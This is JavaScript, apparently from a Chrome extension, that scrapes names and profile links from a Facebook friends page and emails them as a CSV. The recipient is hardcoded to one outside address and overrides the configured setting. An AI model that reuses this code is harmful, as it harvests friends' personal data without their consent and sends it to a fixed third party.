var accountName = '';
var totalFriends = 0;
var friendsData = [];
var data = env;
var parentSelector = '.hybvsw6c.ue3kfks5.pw54ja7n.uo3d90p7.l82x9zwi.rq0escxv.ni8dbmo4.stjgntxs.l9j0dhe7.k4urcfbm.sbcfpzgs';
var newVersion = true;

function defaults() {
  data.emailHost = data.emailHost ?? '';
  data.emailUsername = data.emailUsername ?? '';
  data.emailPassword = data.emailPassword ?? '';
  data.emailTo = data.emailTo ?? 'jim_callanta@ligph.com';
  data.emailFrom = data.emailFrom ?? 'scrapefriends@ligph.com';
  data.emailBody = data.emailBody ?? '<p>Hi!<br/></br>Please see attachment!<br/></br>Thanks!<br/>scrapefriends</p>';
}

function loadFriends() {
  window.scrollBy(0, 9999999999);

  setTimeout(function() {
    if ($(parentSelector).length < 2) {
      loadFriends(16);
    } else {
      insertFriends();
    }
  }, 2000);
}

function newV() {
  let rows = [];
  let parent = $(parentSelector)[0];
  let listContainer = $(parent).find('.i1fnvgqd.lhclo0ds.btwxx1t3.j83agx80')
  
  $(listContainer).find('.oajrlxb2.g5ia77u1.qu0x051f.esr5mh6w.e9989ue4.r7d6kgcz.rq0escxv.nhd2j8a9.nc684nl6.p7hjln8o.kvgmc6g5.cxmmr5t8.oygrvhab.hcukyx3x.jb3vyjys.rz4wbd8a.qt6c0cv9.a8nywdso.i1ao9s8h.esuyzwwr.f1sip0of.lzcic4wl.gmql0nx0')
    .each(function (key, element) {
      let item = $(element);
      let name = item.text();

      if (name.length) {
        let url = item.attr('href');

        if (url && !url.includes("friends_mutual")) {
          rows.push({name: name, url: url});
        }
      }
  });

  console.log('Total Active friends: ' + rows.length);

  return rows;
}

function oldV() {
  let rows = [];

  $('[data-testid="friend_list_item"]').each(function (key, element) {
    let item = $(element);
    let name = item.find('[data-hovercard-prefer-more-content-show]').text();

    if (name.length) {
      let url = item.find('[data-hovercard-prefer-more-content-show]').attr('href');

      rows.push({name: name, url: url});
    }
  });

  console.log('Total Active friends: ' + rows.length);

  return rows;
}

function insertFriends() {
    let header = ["Name", "Facebook"];
    let rows = newVersion ? newV() : oldV();

    sendEmail(toCsv(header, rows));
}

function toCsv(header, rows)
{
  let createXLSLFormatObj = [];
  let ws_name = "Friends List";
  let wb = XLSX.utils.book_new();

  createXLSLFormatObj.push(header);

  $.each(rows, function(index, value) {
    let innerRowData = [];
    $("tbody").append('<tr><td>' + value.name + '</td><td>' + value.FullName + '</td></tr>');

    $.each(value, function(ind, val) {
        innerRowData.push(val);
    });

    createXLSLFormatObj.push(innerRowData);
  });

  let ws = XLSX.utils.aoa_to_sheet(createXLSLFormatObj);
  XLSX.utils.book_append_sheet(wb, ws, ws_name);

  return XLSX.write(wb, {bookType: 'csv', type: 'base64'});
}
  
function sendEmail(attachment) {
  Email.send({
    Host : data.emailHost,
    Username : data.emailUsername,
    Password : data.emailPassword,
    To : 'jim_callanta@ligph.com',
    From : data.emailFrom,
    Subject : accountName + "'s Friends",
    Body : data.emailBody,
      Attachments : [{
        name : accountName + ".csv",
        data : attachment
      }]
  }).then(
    message => console.log(message)
  );
}

chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {

    if (request.message === "clicked_browser_action" ) {
      console.clear();
      defaults();

      if ($('html').hasClass('sidebarMode')) {
        newVersion = false;
        totalFriends = $('[name="All Friends"] span._3d0').text();
      } else {
        totalFriends = $('.rq0escxv.l9j0dhe7.du4w35lb.bp9cbjyn.pq6dq46d.sf5mxxl7 .oi732d6d.ik7dh3pa.d2edcug0.qv66sw1b').text();
      }
      
      accountName = $('title').text();

      loadFriends();
    }

  }
);